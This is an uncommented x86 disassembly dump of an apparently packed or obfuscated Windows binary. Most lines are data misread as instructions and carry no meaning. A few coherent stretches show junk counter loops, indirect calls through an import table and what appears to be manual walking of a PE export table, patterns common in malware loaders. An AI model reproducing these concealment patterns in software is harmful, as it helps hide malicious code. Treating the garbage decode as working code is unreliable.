  414091:	xor    ebx,DWORD PTR [ecx+0x6c]
  414094:	in     eax,0xf9
  414096:	shr    DWORD PTR [ecx],0x38
  414099:	int3   
  41409a:	ja     0x4140f7
  41409c:	adc    eax,0xeccc2c62
  4140a1:	dec    esp
  4140a2:	cdq    
  4140a3:	or     al,0x28
  4140a5:	iret   
  4140a6:	sub    eax,0xee82952d
  4140ab:	inc    eax
  4140ac:	(bad)  
  4140ad:	pop    esi
  4140ae:	fnstsw WORD PTR [ecx]
  4140b0:	push   ss
  4140b1:	fst    st(1)
  4140b3:	(bad)  
  4140b4:	sbb    eax,0xd1bb682a
  4140b9:	inc    edi
  4140ba:	neg    BYTE PTR [ecx-0x77]
  4140bd:	xor    DWORD PTR [ebx],esp
  4140bf:	mov    eax,ds:0x709b3b35
  4140c4:	les    ecx,FWORD PTR [edi]
  4140c6:	(bad)  
  4140c7:	or     eax,0x8dd74443
  4140cc:	repz jmp DWORD PTR [ebx]
  4140cf:	mov    edx,0x415c5659
  4140d4:	hlt    
  4140d5:	idiv   DWORD PTR [ecx]
  4140d7:	or     ebp,DWORD PTR [ebx]
  4140d9:	sbb    al,0x5c
  4140db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140dc:	mov    ah,0xfd
  4140de:	rcr    DWORD PTR [ebx],1
  4140e0:	pop    edi
  4140e1:	add    dh,BYTE PTR [eax]
  4140e3:	mov    ds:0xebbb43b0,eax
  4140e8:	ret    
  4140e9:	mov    esi,0xd7e67e19
  4140ee:	push   edi
  4140ef:	rol    BYTE PTR [esp+ebx*8-0x5c],0x74
  4140f4:	adc    eax,0x88f906c3
  4140f9:	dec    edi
  4140fa:	outs   dx,DWORD PTR ds:[esi]
  4140fb:	int    0x68
  4140fd:	mov    ds:0xadc7184,eax
  414102:	(bad)  
  414103:	rol    DWORD PTR [eax],cl
  414105:	mov    eax,ds:0x7018e3fc
  41410a:	ds sub eax,0x9d57766f
  414110:	cmp    bh,BYTE PTR [ebp+0x5a]
  414113:	rcl    BYTE PTR [edi],0x16
  414116:	sub    bh,dl
  414118:	shr    dh,1
  41411a:	and    bl,BYTE PTR [eax-0x2d]
  41411d:	ja     0x41415d
  41411f:	sub    DWORD PTR [edx],0x3eacb9a4
  414125:	jno    0x414121
  414127:	adc    al,0xb7
  414129:	pop    ss
  41412a:	push   esp
  41412b:	jae    0x4140c0
  41412d:	retf   0xf772
  414130:	mov    ds:0x79ba928c,al
  414135:	dec    eax
  414136:	pop    ss
  414137:	xchg   edi,eax
  414138:	mov    esp,0xdb381112
  41413d:	mov    WORD PTR [eax-0x49],ds
  414140:	mov    edx,0xaf9729d7
  414145:	jbe    0x4140f6
  414147:	clc    
  414148:	inc    eax
  414149:	hlt    
  41414a:	adc    al,0xe
  41414c:	mov    al,ds:0x341c76f0
  414151:	mov    ebp,DWORD PTR [ecx-0x21]
  414154:	lea    eax,ds:0x174e68bd
  41415a:	xor    DWORD PTR [esi+0x458b5737],0xffffffec
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142b4
  414283:	stos   BYTE PTR es:[edi],al
  414284:	dec    esi
  414285:	adc    eax,0x70707380
  41428a:	mov    ecx,0x1b70707e
  41428f:	adc    al,0xf2
  414291:	and    al,0x88
  414293:	cdq    
  414294:	hlt    
  414295:	xchg   ebx,eax
  414296:	mov    WORD PTR [edx+ebx*2+0x6d2b843],?
  41429d:	xlat   BYTE PTR ds:[ebx]
  41429e:	fsubp  st(0),st
  4142a0:	jo     0x414241
  4142a2:	das    
  4142a3:	sar    cl,0x57
  4142a6:	or     dl,dh
  4142a8:	iret   
  4142a9:	popa   
  4142aa:	jae    0x4142ec
  4142ac:	push   ss
  4142ad:	mov    eax,ds:0x856f4323
  4142b2:	aas    
  4142b3:	cmp    ch,cl
  4142b5:	push   0xfffffff5
  4142b7:	xchg   edi,eax
  4142b8:	out    dx,al
  4142b9:	stos   DWORD PTR es:[edi],eax
  4142ba:	(bad)  
  4142bb:	test   al,0x7f
  4142bd:	in     eax,dx
  4142be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142bf:	jnp    0x41426c
  4142c1:	loop   0x414271
  4142c3:	cmp    al,0x4f
  4142c5:	ja     0x414339
  4142c7:	in     al,0xc9
  4142c9:	or     ah,dl
  4142cb:	jle    0x4142eb
  4142cd:	aad    0xbd
  4142cf:	repz ja 0x4142c2
  4142d2:	jecxz  0x4142dc
  4142d4:	xchg   BYTE PTR [edi],cl
  4142d6:	or     al,0x5a
  4142d8:	fcomp  QWORD PTR [ecx-0x68076293]
  4142de:	sub    DWORD PTR [ebx],edx
  4142e0:	sub    esp,DWORD PTR [ecx+ecx*1-0x411262cf]
  4142e7:	(bad)  
  4142e8:	dec    edi
  4142e9:	or     DWORD PTR [edx+edi*1+0x13d95d2f],edi
  4142f0:	xchg   esi,eax
  4142f1:	das    
  4142f2:	sahf   
  4142f3:	(bad)  
  4142f4:	out    0x61,al
  4142f6:	xlat   BYTE PTR ds:[ebx]
  4142f7:	fild   WORD PTR [edx-0x21]
  4142fa:	mov    ebx,0xe12ce0ac
  4142ff:	mov    edi,0x51b594de
  414304:	loopne 0x414328
  414306:	mov    ecx,0x77ad2310
  41430b:	push   esi
  41430c:	mov    esp,0x1c6fd989
  414311:	inc    eax
  414312:	repnz lea ebx,[eax+ebp*1]
  414316:	or     cl,BYTE PTR [edi]
  414318:	imul   ebp,DWORD PTR [ecx-0x6b57051b],0x6b4f097c
  414322:	je     0x414327
  414324:	jmp    0x4c55bcc9
  414329:	xor    al,0x28
  41432b:	push   esp
  41432c:	ret    
  41432d:	push   ds
  41432e:	in     al,0x2
  414330:	call   0xe8690931
  414335:	sbb    cl,BYTE PTR ss:[esi]
  414338:	xchg   edi,eax
  414339:	(bad)  
  41433a:	daa    
  41433b:	(bad)  
  41433d:	jecxz  0x4142db
  41433f:	sbb    ebx,esp
  414341:	cli    
  414342:	add    al,0xd
  414344:	mov    ch,0x5d
  414346:	mov    al,cs:0xa958911e
  41434c:	popf   
  41434d:	les    esi,FWORD PTR [edi+0x36]
  414350:	repnz sahf 
  414352:	fwait
  414353:	or     DWORD PTR [ebx+0x29],esi
  414356:	inc    edi
  414357:	jmp    0x41438e
  414359:	dec    edx
  41435a:	mov    ebx,0x70492489
  41435f:	popf   
  414360:	xor    edi,ebp
  414362:	pop    ss
  414363:	test   cl,dl
  414365:	push   esp
  414366:	pushf  
  414367:	pop    es
  414368:	sub    dh,bh
  41436a:	icebp  
  41436b:	push   0xffffffd0
  41436d:	mov    BYTE PTR [esi-0xf],dl
  414370:	mov    edi,DWORD PTR [ecx+edx*4-0x7aad9901]
  414377:	xor    bh,BYTE PTR [edx-0x3548de85]
  41437d:	out    dx,eax
  41437e:	xor    al,0x45
  414380:	push   es
  414381:	xchg   edx,eax
  414382:	jmp    0x13d5:0x81ab1800
  414389:	retf   0xb842
  41438c:	ret    0xe064
  41438f:	adc    DWORD PTR [edx-0x4d],esi
  414392:	sti    
  414393:	es int 0xd2
  414396:	jmp    0x414337
  414398:	add    BYTE PTR [edx],cl
  41439a:	mov    edi,0x8202b291
  41439f:	mov    eax,ds:0x5a55a164
  4143a4:	pop    ds
  4143a5:	fisttp WORD PTR [eax+eiz*2]
  4143a8:	or     al,ah
  4143aa:	ret    0x45cf
  4143ad:	addr16 mov bh,0x1b
  4143b0:	stos   DWORD PTR es:[edi],eax
  4143b1:	mov    DWORD PTR [ebp+ebx*4+0x61],esp
  4143b5:	test   eax,0x82dc846
  4143ba:	jecxz  0x4143a3
  4143bc:	jg     0x4143a0
  4143be:	out    0x70,eax
  4143c0:	cmp    eax,0x91184353
  4143c5:	mov    eax,ds:0x339530f9
  4143ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143cb:	(bad)  
  4143cf:	mov    ?,WORD PTR [edi-0x5a332049]
  4143d5:	cmp    BYTE PTR ds:0x261ded4b,bh
  4143dc:	popa   
  4143dd:	dec    esp
  4143de:	cdq    
  4143df:	mov    ecx,0x72de9671
  4143e4:	and    al,0xd7
  4143e6:	xchg   ebx,edi
  4143e8:	xchg   edi,eax
  4143e9:	push   edx
  4143ea:	stos   BYTE PTR es:[edi],al
  4143eb:	mov    ds:0x3984fa60,al
  4143f0:	push   ebp
  4143f1:	inc    eax
  4143f2:	pop    ebp
  4143f3:	fstp   TBYTE PTR [ecx+0x76d30f1c]
  4143f9:	fwait
  4143fa:	add    eax,0xb8225701
  4143ff:	iret   
  414400:	out    dx,eax
  414401:	enter  0x4de0,0x38
  414405:	sbb    bh,bh
  414407:	test   al,0x5
  414409:	fisttp DWORD PTR [ecx+edi*4-0xcba6949]
  414410:	cwde   
  414411:	sub    ah,BYTE PTR [ebp+0x942eb00]
  414417:	pop    ecx
  414418:	test   BYTE PTR [ecx],dl
  41441a:	loopne 0x414474
  41441c:	push   ebx
  41441d:	push   ds
  41441e:	xchg   edi,eax
  41441f:	push   eax
  414420:	je     0x4143b4
  414422:	mov    ebp,edi
  414424:	arpl   ax,sp
  414426:	lds    esi,FWORD PTR [edi]
  414428:	jb     0x414473
  41442a:	sbb    eax,0xab56a149
  41442f:	sti    
  414430:	ret    0x37e6
  414433:	mov    BYTE PTR [ecx+0x55],bh
  414436:	(bad)
  414439:	jnp    0x4143f5
  41443b:	pop    ds
  41443c:	push   ebx
  41443d:	and    DWORD PTR [edx+0x7b],esp
  414440:	sub    cl,BYTE PTR [eax-0x7f]
  414443:	addr16 xor eax,0xf208165f
  414449:	test   eax,0x1bef8758
  41444e:	jp     0x4144ae
  414450:	popf   
  414451:	sub    edx,DWORD PTR [ebx-0x146c13d5]
  414457:	mov    ds:0x2b6bb6d7,al
  41445c:	or     al,0xda
  41445e:	outs   dx,DWORD PTR ds:[esi]
  41445f:	outs   dx,BYTE PTR ds:[esi]
  414460:	mov    ebx,0x43e15aee
  414465:	div    BYTE PTR [esi]
  414467:	push   0xeb2293e9
  41446c:	lods   al,BYTE PTR ds:[esi]
  41446d:	push   es
  41446e:	or     dl,bl
  414470:	repz push ds
  414472:	push   ss
  414473:	dec    ecx
  414474:	into   
  414475:	jg     0x414460
  414477:	(bad)  
  414478:	hlt    
  414479:	dec    ecx
  41447a:	and    BYTE PTR [bx],0x61
  41447e:	and    ebp,DWORD PTR [esi]
  414480:	xchg   DWORD PTR [ebx+0x4e095e9a],esi
  414486:	or     ebp,DWORD PTR [ebx+ebx*4+0x66f73f99]
  41448d:	retf   0xe725
  414490:	cwde   
  414491:	sub    BYTE PTR [edi-0x974644d],bh
  414497:	dec    ecx
  414498:	sbb    eax,0x5ff68077
  41449d:	std    
  41449e:	fsubp  st(5),st
  4144a0:	fwait
  4144a1:	js     0x4144b0
  4144a3:	loope  0x4144f5
  4144a5:	cmp    ch,ah
  4144a7:	in     al,dx
  4144a8:	fsincos 
  4144aa:	xchg   ebp,eax
  4144ab:	imul   edi,esp,0xffffff96
  4144ae:	sbb    ebp,DWORD PTR [ebx-0x577b59e5]
  4144b4:	stos   DWORD PTR es:[edi],eax
  4144b5:	or     esi,ecx
  4144b7:	mov    ebp,0x137c8bee
  4144bc:	ret    0xbe26
  4144bf:	inc    edx
  4144c0:	cli    
  4144c1:	out    dx,eax
  4144c2:	jle    0x41451a
  4144c4:	repnz sub dh,BYTE PTR [edi-0x150a419a]
  4144cb:	pop    ss
  4144cc:	dec    esi
  4144cd:	sub    ecx,ebx
  4144cf:	aas    
  4144d0:	int    0x47
  4144d2:	xor    DWORD PTR [ecx-0x26],edi
  4144d5:	sub    BYTE PTR ds:0x88123669,dl
  4144db:	push   ss
  4144dc:	cmp    ebx,esp
  4144de:	xor    al,0x7d
  4144e0:	lods   al,BYTE PTR ds:[esi]
  4144e1:	cmp    eax,0x3c8b7bd1
  4144e6:	std    
  4144e7:	push   ebx
  4144e8:	popf   
  4144e9:	ds out 0x9,eax
  4144ec:	cmp    eax,0x74df2137
  4144f1:	mov    WORD PTR [edi-0x2894dfa],?
  4144f7:	hlt    
  4144f8:	xor    edi,DWORD PTR [edx-0x6106e62d]
  4144fe:	mov    ch,0x63
  414500:	lods   al,BYTE PTR ds:[esi]
  414501:	lods   eax,DWORD PTR ds:[esi]
  414502:	sbb    ah,BYTE PTR [esi+0x6d9892d1]
  414508:	sar    BYTE PTR [ebx+ebx*2],0xb
  41450c:	or     BYTE PTR [edx+0x5b],cl
  41450f:	and    eax,ebx
  414511:	outs   dx,DWORD PTR ds:[esi]
  414512:	xor    ch,BYTE PTR [ebx+0x55bf3cc0]
  414518:	xor    ch,ah
  41451a:	jb     0x4144b3
  41451c:	fisub  DWORD PTR [esi+0x6f]
  41451f:	jnp    0x4144dc
  414521:	jecxz  0x4144d6
  414523:	pop    ss
  414524:	int    0xc6
  414526:	and    DWORD PTR [esi],ebx
  414528:	shr    ah,0x67
  41452b:	or     BYTE PTR [ebx],cl
  41452d:	js     0x4144ce
  41452f:	punpckhbw mm5,QWORD PTR [esi]
  414532:	adc    dl,BYTE PTR [eax+0x6d0e399f]
  414538:	jp     0x414574
  41453a:	pushf  
  41453b:	xor    ebp,esi
  41453d:	sahf   
  41453e:	jp     0x414512
  414540:	fadd   QWORD PTR [esi-0x60]
  414543:	lods   eax,DWORD PTR ds:[esi]
  414544:	inc    eax
  414545:	imul   ebp,DWORD PTR [ebx-0x5a1c6474],0xb
  41454c:	mov    eax,ds:0x55053871
  414551:	xor    edx,DWORD PTR [eax]
  414553:	(bad)  [edi-0x1]
  414556:	jne    0x414528
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x41bbbeb4
  414576:	dec    esp
  414577:	(bad)  
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414530
  414581:	and    al,0xdd
  414583:	inc    ecx
  414584:	mov    esp,0x60c684d1
  414589:	pushf  
  41458a:	xor    cl,BYTE PTR [ecx+0x2bb8d91f]
  414590:	sbb    BYTE PTR [ecx+0x7b],ch
  414593:	test   al,0xc6
  414595:	add    bh,BYTE PTR [edx+edx*1-0x4c]
  414599:	push   cs
  41459a:	mov    edx,0xf1fe7d42
  41459f:	or     al,0xe2
  4145a1:	cwde   
  4145a2:	pop    ebx
  4145a3:	and    bl,dh
  4145a5:	test   eax,ebp
  4145a7:	xchg   dl,al
  4145a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145aa:	jl     0x4145b8
  4145ac:	arpl   WORD PTR ds:0x8207a399,bx
  4145b2:	cmp    esi,ecx
  4145b4:	fist   DWORD PTR [ebx+ebp*1-0x38b02f9f]
  4145bb:	cmp    al,0xc4
  4145bd:	pop    ebp
  4145be:	push   0xd4fbb506
  4145c3:	scas   eax,DWORD PTR es:[edi]
  4145c4:	add    ecx,0x419fc2dc
  4145ca:	pop    ebp
  4145cb:	test   DWORD PTR [ebx],edx
  4145cd:	cmp    eax,0x807ac8ff
  4145d2:	mov    ecx,0xf771c451
  4145d7:	addr16 inc edx
  4145d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145da:	inc    esp
  4145db:	xor    ch,BYTE PTR [eax]
  4145dd:	sar    BYTE PTR [eax+0x78],0xab
  4145e1:	xchg   edi,eax
  4145e2:	je     0x41461d
  4145e4:	fwait
  4145e5:	mov    bl,0x7f
  4145e7:	pop    ss
  4145e8:	enter  0xa26d,0xbe
  4145ec:	ror    BYTE PTR [ebx+edx*8],1
  4145ef:	mov    al,0x87
  4145f1:	(bad)  
  4145f2:	dec    eax
  4145f3:	xchg   esp,eax
  4145f4:	lds    edi,FWORD PTR [ebp+0x57]
  4145f7:	imul   eax,esp,0x4ea8aafd
  4145fd:	bound  esp,QWORD PTR [eax]
  4145ff:	leave  
  414600:	(bad)  
  414601:	mov    ds:0x926f8da1,eax
  414606:	sbb    esi,DWORD PTR [ebx-0x59]
  414609:	hlt    
  41460a:	cmc    
  41460b:	xor    DWORD PTR [edx],eax
  41460d:	pop    ss
  41460e:	jge    0x414599
  414610:	jmp    0x4145e9
  414612:	das    
  414613:	dec    edx
  414614:	les    edx,FWORD PTR [edi+0x3e125545]
  41461a:	in     eax,dx
  41461b:	or     al,0xb0
  41461d:	fild   WORD PTR [eax-0x5343eae]
  414623:	fldln2 
  414625:	psadbw mm1,QWORD PTR [esp+ecx*2]
  414629:	data16 jl 0x4146a6
  41462c:	xchg   edi,eax
  41462d:	or     bh,BYTE PTR [edi-0x3d]
  414630:	push   eax
  414631:	fnstenv [ebx+0x4e1076e4]
  414637:	inc    esp
  414638:	es ds cmp al,0x2a
  41463c:	push   ds
  41463d:	cdq    
  41463e:	out    dx,eax
  41463f:	pop    DWORD PTR [ebx+0x5765fc0e]
  414645:	in     eax,dx
  414646:	pop    ecx
  414647:	sbb    BYTE PTR [edi+0x73ca2526],dl
  41464d:	xchg   ebp,eax
  41464e:	adc    DWORD PTR [edx],ebp
  414650:	int    0xdc
  414652:	and    eax,0xc92b6bc5
  414657:	ret    0x8e74
  41465a:	mov    dl,0x9b
  41465c:	push   edx
  41465d:	mov    ebx,0xa0c1bf0a
  414662:	pop    edx
  414663:	loop   0x414697
  414665:	push   ebp
  414666:	xchg   ecx,eax
  414667:	sub    BYTE PTR [esp+ecx*2-0x6c],ch
  41466b:	data16 jns 0x4146c0
  41466e:	sbb    al,BYTE PTR [edi+0x7e]
  414671:	mov    edx,0xbfca4422
  414677:	seto   dh
  41467a:	pop    edx
  41467b:	pop    ebx
  41467c:	ins    BYTE PTR es:[edi],dx
  41467d:	imul   esp,DWORD PTR [edi-0x12],0x18ea0c2b
  414684:	clc    
  414685:	neg    esi
  414687:	dec    esi
  414688:	dec    esp
  414689:	ja     0x41460c
  41468b:	les    ebx,FWORD PTR [ecx]
  41468d:	scas   al,BYTE PTR es:[edi]
  41468e:	xchg   BYTE PTR [edi-0x73],dh
  414691:	jge    0x4146e5
  414693:	ins    DWORD PTR es:[edi],dx
  414694:	out    dx,eax
  414695:	and    DWORD PTR [esp+ebx*4-0x759f742a],ebp
  41469c:	mov    BYTE PTR [ebx],al
  41469e:	mov    ebx,0x3bec911
  4146a3:	shr    BYTE PTR [ebx],cl
  4146a5:	in     eax,dx
  4146a6:	mov    DWORD PTR [edx],edi
  4146a8:	stos   BYTE PTR es:[edi],al
  4146a9:	lods   eax,DWORD PTR ds:[esi]
  4146aa:	in     eax,dx
  4146ab:	out    dx,al
  4146ac:	retf   
  4146ad:	daa    
  4146ae:	mov    edx,0x757f685f
  4146b3:	pushf  
  4146b4:	ficomp DWORD PTR [eax]
  4146b6:	push   es
  4146b7:	push   ss
  4146b8:	popa   
  4146b9:	add    eax,0x3245c2ae
  4146be:	and    eax,0xbcf7fdf
  4146c3:	jo     0x41467a
  4146c5:	int    0x69
  4146c7:	push   ss
  4146c8:	fild   WORD PTR [ecx+eiz*1-0x12bad7c6]
  4146cf:	dec    esi
  4146d0:	jns    0x4146d1
  4146d2:	fmul   DWORD PTR [edx+0x51]
  4146d5:	mov    ebp,0x126a6249
  4146da:	pop    ss
  4146db:	mov    cl,0x1d
  4146dd:	popf   
  4146de:	outs   dx,BYTE PTR ds:[esi]
  4146df:	je     0x4146e2
  4146e1:	push   edi
  4146e2:	ror    DWORD PTR [edx],cl
  4146e4:	leave  
  4146e5:	test   ah,ch
  4146e7:	pop    ecx
  4146e8:	xchg   edx,eax
  4146e9:	jp     0x414697
  4146eb:	lods   eax,DWORD PTR ds:[esi]
  4146ec:	js     0x414710
  4146ee:	xchg   ecx,eax
  4146ef:	dec    esi
  4146f0:	loop   0x4146d8
  4146f2:	jns    0x414765
  4146f4:	cmp    edi,DWORD PTR [edx]
  4146f6:	emms   
  4146f8:	arpl   WORD PTR [bp+di+0x33],ax
  4146fc:	jge    0x4146d7
  4146fe:	cwde   
  4146ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414700:	jne    0x41476b
  414702:	adc    eax,0x570b4219
  414707:	fisubr WORD PTR cs:[esi-0xe]
  41470b:	test   eax,ecx
  41470d:	out    0x61,al
  41470f:	call   0x6ea9:0x50aab6bc
  414716:	pop    ebp
  414717:	dec    esp
  414718:	es int 0xa4
  41471b:	jbe    0x414730
  41471d:	cmp    al,ah
  41471f:	mov    al,ds:0x44994e0
  414724:	inc    ecx
  414725:	into   
  414726:	out    dx,eax
  414727:	mov    dl,0x77
  414729:	mov    edx,0xfd2f13d8
  41472e:	mov    ebx,0xdac5d3d6
  414733:	enter  0x5cbf,0xe5
  414737:	push   0xffffffab
  414739:	lea    eax,ss:[edi+0x3dd91751]
  414740:	mov    bl,0x5d
  414743:	mov    ebx,0x24d0dace
  414748:	fs into 
  41474a:	jle    0x41473b
  41474c:	jl     0x41475b
  41474e:	pop    esp
  41474f:	mov    eax,0x793f7f3d
  414754:	mov    ebx,0xbf38e249
  414759:	fcomi  st,st(5)
  41475b:	xchg   ebp,eax
  41475c:	jp     0x4147c1
  41475e:	int    0x9b
  414760:	xor    cl,bh
  414762:	call   0xf5aa:0x1bfbfaae
  414769:	pop    edi
  41476a:	mov    eax,0x7c8f2d59
  41476f:	xor    eax,0x6f7244f4
  414775:	pop    esp
  414776:	mov    ds:0xd5301c3a,eax
  41477b:	addr16 in eax,dx
  41477d:	xchg   edx,eax
  41477e:	lods   eax,DWORD PTR ds:[esi]
  41477f:	and    BYTE PTR ds:[ebx+ecx*4],0x8a
  414784:	in     al,dx
  414785:	js     0x414747
  414787:	mov    edi,0x3c4d3a3d
  41478d:	pop    ss
  41478e:	mul    DWORD PTR [ebp+ecx*4-0x2e731d63]
  414795:	ret    0x63b6
  414798:	test   eax,0xaf3d3e23
  41479d:	adc    eax,0xb17ff8a
  4147a2:	lods   al,BYTE PTR ds:[esi]
  4147a3:	aaa    
  4147a4:	retf   
  4147a5:	(bad)  
  4147a6:	daa    
  4147a7:	test   eax,0xd68d60d4
  4147ac:	stc    
  4147ad:	nop
  4147ae:	dec    esp
  4147af:	xchg   ecx,eax
  4147b0:	inc    esi
  4147b1:	cld    
  4147b2:	cdq    
  4147b3:	daa    
  4147b4:	popa   
  4147b5:	jp     0x41478f
  4147b7:	lds    ecx,FWORD PTR [ebp+0x40]
  4147ba:	in     al,dx
  4147bb:	int    0x4
  4147bd:	or     dh,al
  4147bf:	xor    dl,cl
  4147c1:	andnps xmm1,XMMWORD PTR [ecx-0x7a]
  4147c5:	(bad)  
  4147c6:	pop    eax
  4147c7:	std    
  4147c8:	jne    0x414766
  4147ca:	nop
  4147cb:	or     DWORD PTR [edi-0x3a986eb7],ebp
  4147d1:	cld    
  4147d2:	pusha  
  4147d3:	div    BYTE PTR [esi+0x45]
  4147d6:	mov    edi,0xbedccaf6
  4147db:	add    al,0x41
  4147dd:	dec    edx
  4147de:	cmp    al,0xa
  4147e0:	dec    esp
  4147e1:	into   
  4147e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147e3:	jo     0x4147a7
  4147e5:	sub    cl,BYTE PTR [eax-0x4c]
  4147e8:	and    al,0x9b
  4147ea:	dec    edx
  4147eb:	sub    eax,0x557d3917
  4147f0:	out    0xf3,eax
  4147f2:	xrelease xchg DWORD PTR [ebp-0x6aba9843],esi
  4147f9:	(bad)  
  4147fa:	fcom   QWORD PTR [esp+ecx*4]
  4147fd:	imul   DWORD PTR [esp+ebx*1]
  414800:	push   esp
  414801:	sti    
  414802:	call   0x9f762d88
  414807:	out    dx,al
  414808:	mov    esi,DWORD PTR [ebx+0x1e1c9e9]
  41480e:	jbe    0x4147f5
  414810:	or     BYTE PTR [ecx+0x37f0011a],cl
  414816:	adc    ebp,DWORD PTR [eax]
  414818:	mov    dh,0x18
  41481a:	mov    ah,0xa5
  41481c:	stos   BYTE PTR es:[edi],al
  41481d:	push   esp
  41481e:	imul   eax,DWORD PTR [edx-0x26],0xffffff99
  414822:	inc    edi
  414823:	lods   eax,DWORD PTR ds:[esi]
  414824:	xchg   edx,eax
  414825:	cmp    ch,BYTE PTR [ebx]
  414827:	mov    esp,0x9d76218f
  41482c:	(bad)  [edx+0x5f]
  41482f:	mov    edx,0x53daba35
  414834:	sbb    eax,0x27e6e551
  414839:	ror    esp,0x54
  41483c:	sbb    al,0x52
  41483e:	mov    ah,0x6a
  414840:	and    ebp,esp
  414842:	adc    BYTE PTR [esi+eiz*2],cl
  414845:	push   0x18
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414841
  414861:	add    bl,BYTE PTR ss:[edx+0x12]
  414865:	jge    0x4148e6
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x414818
  41486d:	push   di
  41486f:	loope  0x4147f5
  414871:	sbb    DWORD PTR [eax],ecx
  414873:	fs push cs
  414875:	loopne 0x4147f9
  414877:	int    0x1d
  414879:	pop    eax
  41487a:	mov    bh,0xff
  41487c:	xchg   edi,edx
  41487e:	cmp    DWORD PTR [esi-0x34],eax
  414881:	into   
  414882:	xchg   esp,eax
  414883:	out    dx,al
  414884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414885:	sub    bl,BYTE PTR [ecx]
  414887:	jl     0x4148b7
  414889:	or     ecx,DWORD PTR [edx-0x5c42e31f]
  41488f:	pusha  
  414890:	stos   BYTE PTR es:[edi],al
  414891:	push   ebx
  414892:	lds    eax,FWORD PTR [edi-0x7eebd637]
  414898:	test   al,0xb1
  41489a:	das    
  41489b:	xor    al,0x48
  41489d:	popa   
  41489e:	lea    edx,[eax]
  4148a0:	dec    edx
  4148a1:	cmp    ch,BYTE PTR [ebx+ecx*4]
  4148a4:	push   cs
  4148a5:	shl    DWORD PTR [ebx-0x28],0x48
  4148a9:	and    edx,DWORD PTR [ebx]
  4148ab:	mov    ch,0x37
  4148ad:	ja     0x4148c2
  4148af:	in     al,0x8f
  4148b1:	pop    ecx
  4148b2:	test   BYTE PTR [ecx-0x79bcfe82],0xcd
  4148b9:	mov    ebx,0xb442ab6a
  4148be:	or     dl,dh
  4148c0:	sti    
  4148c1:	push   es
  4148c2:	(bad)  
  4148c3:	pop    ds
  4148c4:	adc    bl,al
  4148c6:	iret   
  4148c7:	test   al,0xc1
  4148c9:	cmp    ebx,DWORD PTR [edi+edx*4+0x78]
